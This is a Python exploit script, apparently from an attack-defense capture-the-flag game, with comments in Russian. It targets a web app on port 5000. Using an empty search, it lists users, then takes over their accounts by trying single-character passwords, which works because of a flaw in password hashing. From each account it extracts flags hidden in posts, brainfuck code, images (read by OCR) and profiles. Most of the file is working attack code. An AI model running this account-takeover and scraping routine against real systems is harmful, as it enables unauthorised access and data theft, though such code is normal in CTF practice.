#!/usr/bin/env python3

# Третья уязвимость - переполнение буфера при хэшировании, что позволяет залогиниться зная первыый символ пароля.
# Здесь также используется возможность поиска по пустой строке
# необходимо зарегестрировать пользователя wee с паролем wee
import requests
from requests.auth import HTTPBasicAuth
import json
import time
import re
import sys
import easyocr
 
import bfParser

ip = sys.argv[1]
ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&\'()*+,-./:;<=>?@\^_`{|}~"

with requests.Session() as s:
    p = s.get('http://{}:5000/login'.format(ip))
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
    
    p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
    # print(p.text)
    users = re.findall('<a href="/user/(.*)" class="profile-link">', p.text)
    users = users[-5:]
    print(users)
    
    for user in users:
        with requests.Session() as s1:
            p = s1.get('http://{}:5000/login'.format(ip))
            csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    
            print(user)
            for c in ALPHABET:
                p = s1.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username={}&password={}&submit=Sign+In'.format(csrf[0], user, c).encode('UTF-8'), headers = headers)
                if "Hello!" not in p.text:
                    continue
                posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
                print(posts) # Получили все флаги, хранящиеся в открытом виде
                
                posts = re.findall('">([\-\[\&gt;+l\]\.]+)<[\/]', p.text)
                for bf in posts:
                    bf = bf.replace("&gt;",">")
                    bf = bf.replace("&lt;","<")
                    res = bfParser.evaluate(bf)
                    print(res) # Получили флаги, хранящиеся в виде брейнфак кода

                
                images = re.findall('src=" /image/(.*).png"', p.text)
                for image in images:
                    p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
                    if p.status_code == 200:
                        with open("321.png", 'wb') as f:
                            f.write(p.content)
                    reader = easyocr.Reader(['en'])
                    result = reader.readtext('321.png', detail = 0)
                    result = ' '.join(result)
                    nums = re.findall(r'\d\d', result)
                    flag2 = ''.join((chr(int(c))) for c in nums)
                    print(flag2) # Получили флаги из картинок

                p = s1.get('http://{}:5000/user/{}'.format(ip, user))
                posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
                if posts:
                    print(posts) # Получили флаги из описания профиля
                break